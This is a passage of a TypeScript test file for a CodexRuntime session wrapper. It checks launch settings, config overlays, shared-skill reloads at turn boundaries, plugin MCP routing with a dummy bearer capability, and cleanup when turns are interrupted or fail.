            { key: 'tools-off', value: ['request_user_input'] },
            { key: 'tools-left-on', value: ['request_user_input_async'] },
          ])
          const config = readFileSync(join(home, 'config.toml'), 'utf8')
          expect(config).toContain('memories = true')
          expect(config).toContain('dedicated_tools = true')
          expect(config).toContain('use_memories = true')
          expect(config).toContain('generate_memories = true')
          expect(JSON.stringify(handle.launchSettings)).not.toContain('127.0.0.1')
        } finally {
          await handle.close()
        }
      })
    }

    it(`${opening} keeps memory unknown when the merge is refused`, async () => {
      const original = 'features = 3\n'
      writeFileSync(join(home, 'config.toml'), original)
      const transport = new FakeTransport()
      transport.onRequest(`thread/${opening}`, () => okThread('th_1'))
      const runtime = new CodexRuntime(adopt(transport))
      const handle =
        opening === 'start'
          ? await runtime.start({ cwd: '/tmp/x', providerHome: home })
          : await runtime.resume(
              { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
              { providerHome: home },
            )
      try {
        expect(handle.launchSettings?.find((one) => one.key === 'memory')?.value).toBeNull()
        expect(handle.launchSettings?.find((one) => one.key === 'thread-overrides')?.value).toEqual(
          ['tools.update_plan.enabled=true', 'tools.experimental_request_user_input.enabled=false'],
        )
        expect(readFileSync(join(home, 'config.toml'), 'utf8')).toBe(original)
      } finally {
        await handle.close()
      }
    })
  }

  it.each([
    [{}, 'default'],
    [{ planMode: true }, 'plan'],
    [{ planMode: true, planModeEnded: true }, 'default'],
  ] as const)('records the initial collaboration selection %j', async (options, expected) => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: home,
      ...options,
    })
    try {
      expect(handle.launchSettings?.find((one) => one.key === 'collaboration-mode')?.value).toBe(
        expected,
      )
      const sent = transport.requests.find((one) => one.method === 'thread/start')
        ?.params as Record<string, unknown>
      expect(sent).not.toHaveProperty('collaborationMode')
      expect(sent['config']).toEqual({
        'tools.update_plan.enabled': true,
        'tools.experimental_request_user_input.enabled': false,
      })
    } finally {
      await handle.close()
    }
  })

  it('later settings and file changes do not replace or mutate the launch values', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: home,
    })
    try {
      const launched = handle.launchSettings
      const original = JSON.stringify(launched)
      await handle.setApprovalMode?.('auto')
      await handle.setPlanMode?.(true)
      await handle.setReasoningEffort?.('low')
      await handle.setModel?.('another-model')
      handle.setWorkFolders?.(['/fictional/later'])
      writeFileSync(join(home, 'config.toml'), 'features = 3\n')
      expect(handle.launchSettings).toBe(launched)
      expect(JSON.stringify(handle.launchSettings)).toBe(original)
      expect(Object.isFrozen(launched)).toBe(true)
      for (const one of launched ?? []) {
        expect(Object.isFrozen(one)).toBe(true)
        if (Array.isArray(one.value)) expect(Object.isFrozen(one.value)).toBe(true)
      }
      expect(transport.requests.filter((one) => one.method === 'thread/start')).toHaveLength(1)
    } finally {
      await handle.close()
    }
  })
})

describe('shared skills at a Codex turn boundary', () => {
  let home: string
  beforeEach(() => {
    home = realpathSync(mkdtempSync(join(tmpdir(), 'fictional-shared-codex-')))
  })
  afterEach(() => {
    rmSync(home, { recursive: true, force: true })
  })
  it.each([
    ['start', false],
    ['resume', false],
    ['start', true],
    ['resume', true],
  ] as const)(
    'registers both roots on %s and reloads before each turn (managed plugin: %s)',
    async (opening, withPlugin) => {
      const transport = new FakeTransport()
      transport.onRequest('thread/start', () => okThread('th_1', home))
      transport.onRequest('thread/resume', () => okThread('th_1', home))
      transport.onRequest('skills/list', () => ({
        data: [{ cwd: home, errors: [], skills: [] }],
      }))
      transport.onRequest('mcpServerStatus/list', () => ({
        data: [{ name: 'plugin-fern', runtimeStatus: 'connected', toolsError: null, tools: {} }],
      }))
      const runtime = new CodexRuntime(adopt(transport))
      const context = {
        providerHome: home,
        builtInSkills: { root: join(home, 'built-in-skills'), skills: [] },
        sharedSkillsRoot: join(home, 'shared-skills'),
        ...(withPlugin
          ? {
              managedPluginMcp: [
                {
                  name: 'plugin-fern',
                  url: 'http://127.0.0.1:8123/mcp',
                  capability: 'a'.repeat(64),
                },
              ],
            }
          : {}),
      }
      const handle =
        opening === 'start'
          ? await runtime.start({ ...context, cwd: home })
          : await runtime.resume(
              { provider: 'codex', sessionId: 'th_1', cwd: home, rotation: 0 },
              context,
            )
      expect(
        transport.requests.find((one) => one.method === 'skills/extraRoots/set')?.params,
      ).toEqual({ extraRoots: [context.builtInSkills.root, context.sharedSkillsRoot] })
      expect(transport.requests.filter((one) => one.method === 'skills/config/write')).toEqual([])
      const first = transport.requests.length
      await handle.send('Check the recipe.')
      await vi.waitFor(() =>
        expect(transport.requests.slice(first).some((one) => one.method === 'turn/start')).toBe(
          true,
        ),
      )
      expect(
        transport.requests
          .slice(first)
          .filter((one) =>
            ['mcpServerStatus/list', 'skills/list', 'turn/start'].includes(one.method),
          )
          .map((one) => one.method),
      ).toEqual(
        withPlugin
          ? ['mcpServerStatus/list', 'skills/list', 'turn/start']
          : ['skills/list', 'turn/start'],
      )
      expect(
        transport.requests.slice(first).find((one) => one.method === 'skills/list')?.params,
      ).toEqual({ cwds: [home], forceReload: true })
      await expect(handle.send('A concurrent turn.')).rejects.toThrow()
      transport.notification(
        'turn/completed',
        turnCompletedNotification('th_1', completedTurn(transport.lastTurnId)),
      )
      await vi.waitFor(() => expect(handle.status()).toBe('idle'))
      const second = transport.requests.length
      await handle.send('Check the edited recipe.')
      await vi.waitFor(() =>
        expect(transport.requests.slice(second).some((one) => one.method === 'turn/start')).toBe(
          true,
        ),
      )
      expect(
        transport.requests
          .slice(second)
          .filter((one) => ['skills/list', 'turn/start'].includes(one.method))
          .map((one) => one.method),
      ).toEqual(['skills/list', 'turn/start'])
      transport.notification(
        'turn/completed',
        turnCompletedNotification('th_1', completedTurn(transport.lastTurnId)),
      )
      await vi.waitFor(() => expect(handle.status()).toBe('idle'))
      transport.onRequest('skills/list', () =>
        Promise.reject(new Error('fictional reload failure')),
      )
      await handle.send('An unread refresh.')
      await vi.waitFor(() =>
        expect(transport.requests.filter((one) => one.method === 'turn/start')).toHaveLength(3),
      )
      transport.notification(
        'turn/completed',
        turnCompletedNotification('th_1', completedTurn(transport.lastTurnId)),
      )
      await vi.waitFor(() => expect(handle.status()).toBe('idle'))
      const afterFailure = transport.requests.filter((one) => one.method === 'turn/start').length
      expect(afterFailure).toBe(3)
      let release!: () => void
      transport.onRequest(
        'skills/list',
        () =>
          new Promise((done) => {
            release = () => done({ data: [] })
          }),
      )
      await handle.send('A turn stopped during refresh.')
      await vi.waitFor(() => expect(release).toBeDefined())
      await handle.close()
      release()
      await new Promise((done) => setTimeout(done, 10))
      expect(transport.requests.filter((one) => one.method === 'turn/start')).toHaveLength(
        afterFailure,
      )
    },
  )
})
it.each(['start', 'resume'] as const)(
  'managed plugin Codex %s carries only its broker capability',
  async (launch) => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    transport.onRequest('thread/resume', () => okThread('th_1'))
    const runtime = new CodexRuntime(adopt(transport))
    const route = {
      name: 'plugin-fern',
      url: 'http://127.0.0.1:8123/mcp',
      capability: 'a'.repeat(64),
    }
    const context = {
      providerHome: '/tmp/x/home',
      managedPluginMcp: [route],
      externalMcp: {
        servers: [{ name: 'fictional-registry', url: 'http://127.0.0.1:8124/mcp' }],
        reservedToolNames: [],
      },
    }
    const handle =
      launch === 'start'
        ? await runtime.start({ cwd: '/tmp/x', ...context })
        : await runtime.resume(
            { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 1 },
            context,
          )
    try {
      const request = transport.requests.find((one) => one.method === `thread/${launch}`)
      expect((request?.params as { config: unknown }).config).toEqual({
        ...EVERY_THREAD_OVERLAY,
        mcp_servers: {
          'fictional-registry': { url: 'http://127.0.0.1:8124/mcp' },
          'plugin-fern': {
            url: route.url,
            http_headers: { Authorization: `Bearer ${route.capability}` },
          },
        },
      })
    } finally {
      await handle.close()
    }
  },
)

describe('managed resume ownership', () => {
  it('retains the allocated handle before a refused resume handshake', async () => {
    const transport = new FakeTransport()
    const die = transport.ownsAProcess()
    transport.onRequest('thread/resume', () => {
      throw new Error('fictional refusal')
    })
    const runtime = new CodexRuntime(adopt(transport))
    let allocated: SessionHandle | undefined
    try {
      await expect(
        runtime.resume(
          { provider: 'codex', sessionId: 'fictional-thread', cwd: '/tmp/x', rotation: 0 },
          {
            providerHome: '/tmp/x/home',
            onSessionCreated: (handle) => {
              allocated = handle
            },
          },
        ),
      ).rejects.toThrow()
      expect(allocated).toBeDefined()
      expect(allocated!.awaitProcessExit!()).toBe(transport.exited)
    } finally {
      die()
      await allocated?.close()
    }
  })
  it('publishes the stronger cleanup fact when the transport can prove group quiescence', async () => {
    const transport = new FakeTransport()
    transport.ownsAProcess()()
    let quiet!: () => void
    transport.quiesced = new Promise<void>((resolve) => {
      quiet = resolve
    })
    transport.onRequest('thread/start', () => okThread('fictional-thread'))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })
    try {
      expect(handle.awaitProcessExit!()).toBe(transport.quiesced)
      let proved = false
      void handle.awaitProcessExit!()!.then(() => {
        proved = true
      })
      await handle.close()
      expect(proved).toBe(false)
    } finally {
      quiet()
      await handle.close()
    }
    await handle.awaitProcessExit!()
  })
})

describe('a slow Codex app-server is waited for at a turn boundary', () => {
  let home: string
  beforeEach(() => {
    home = realpathSync(mkdtempSync(join(tmpdir(), 'fictional-slow-codex-')))
  })
  afterEach(() => {
    vi.useRealTimers()
    rmSync(home, { recursive: true, force: true })
  })

  async function aSessionWithSharedSkills(generation?: () => number): Promise<{
    transport: FakeTransport
    handle: Awaited<ReturnType<CodexRuntime['start']>>
    events: RuntimeEvent[]
    consumer: Promise<void>
  }> {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1', home))
    transport.onRequest('skills/list', () => ({ data: [{ cwd: home, errors: [], skills: [] }] }))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({
      cwd: home,
      providerHome: home,
      builtInSkills: { root: join(home, 'built-in-skills'), skills: [] },
      sharedSkillsRoot: join(home, 'shared-skills'),
      ...(generation ? { sharedSkillsGeneration: generation } : {}),
    })
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    return { transport, handle, events, consumer }
  }

  const asked = (transport: FakeTransport, method: string): number =>
    transport.requests.filter((one) => one.method === method).length

  const endTheTurn = async (
    transport: FakeTransport,
    handle: { status(): string },
  ): Promise<void> => {
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn(transport.lastTurnId)),
    )
    await vi.waitFor(() => expect(handle.status()).toBe('idle'))
  }

  it('refreshes the shared skills only when they changed since the session loaded them', async () => {
    let generation = 7
    const { transport, handle, consumer } = await aSessionWithSharedSkills(() => generation)
    try {
      const atLaunch = asked(transport, 'skills/list')
      await handle.send('First, with the skills it launched with.')
      await vi.waitFor(() => expect(asked(transport, 'turn/start')).toBe(1))
      await endTheTurn(transport, handle)
      expect(asked(transport, 'skills/list')).toBe(atLaunch)
      generation = 8
      await handle.send('Second, after a skill was edited.')
      await vi.waitFor(() => expect(asked(transport, 'turn/start')).toBe(2))
      await endTheTurn(transport, handle)
      expect(asked(transport, 'skills/list')).toBe(atLaunch + 1)
      await handle.send('Third, nothing changed.')
      await vi.waitFor(() => expect(asked(transport, 'turn/start')).toBe(3))
      await endTheTurn(transport, handle)
      expect(asked(transport, 'skills/list')).toBe(atLaunch + 1)
    } finally {
      await handle.close()
      await consumer
    }
  })

  it('a skill refresh slower than fifteen seconds is waited for, and the turn reaches Codex', async () => {
    const { transport, handle, events, consumer } = await aSessionWithSharedSkills()
    let answer!: () => void
    transport.onRequest(
      'skills/list',
      () =>
        new Promise((done) => {
          answer = () => done({ data: [] })
        }),
    )
    vi.useFakeTimers()
    try {
      await handle.send('Reach Codex once the skills are in.')
      await vi.advanceTimersByTimeAsync(16_000)
      expect(asked(transport, 'turn/start')).toBe(0)
      expect(events.some((event) => event.type === 'turn' && event.state === 'failed')).toBe(false)
      answer()
      await vi.advanceTimersByTimeAsync(0)
      expect(asked(transport, 'turn/start')).toBe(1)
    } finally {
      vi.useRealTimers()
      await handle.close()
      await consumer
    }
  })

  it('Stop ends a turn waiting on its skill refresh, and nothing is sent after it', async () => {
    const { transport, handle, events, consumer } = await aSessionWithSharedSkills()
    let answer!: () => void
    transport.onRequest(
      'skills/list',
      () =>
        new Promise((done) => {
          answer = () => done({ data: [] })
        }),
    )
    try {
      await handle.send('Stopped before it went.')
      await vi.waitFor(() => expect(answer).toBeDefined())
      await handle.interrupt()
      await vi.waitFor(() => expect(handle.status()).toBe('idle'))
      answer()
      await new Promise((done) => setTimeout(done, 10))
      expect(asked(transport, 'turn/start')).toBe(0)
      expect(events.some((event) => event.type === 'turn' && event.state === 'failed')).toBe(false)
      transport.onRequest('skills/list', () => ({ data: [] }))
      await handle.send('The next one.')
      await vi.waitFor(() => expect(asked(transport, 'turn/start')).toBe(1))
    } finally {
      await handle.close()
      await consumer
    }
  })

  it('a skill refresh that fails is said, and the turn still reaches Codex', async () => {
    let generation = 1
    const { transport, handle, events, consumer } = await aSessionWithSharedSkills(() => generation)
    generation = 2
    transport.onRequest('skills/list', () => Promise.reject(new Error('fictional refresh failure')))
    try {
      await handle.send('Go with the skills already loaded.')
      await vi.waitFor(() => expect(asked(transport, 'turn/start')).toBe(1))
      expect(
        events.some(
          (event) =>
            event.type === 'error' &&
            event.fatal === false &&
            event.message === 'Shared skills could not be refreshed: fictional refresh failure',
        ),
      ).toBe(true)
      await endTheTurn(transport, handle)
    } finally {
      await handle.close()
      await consumer
    }
  })
})
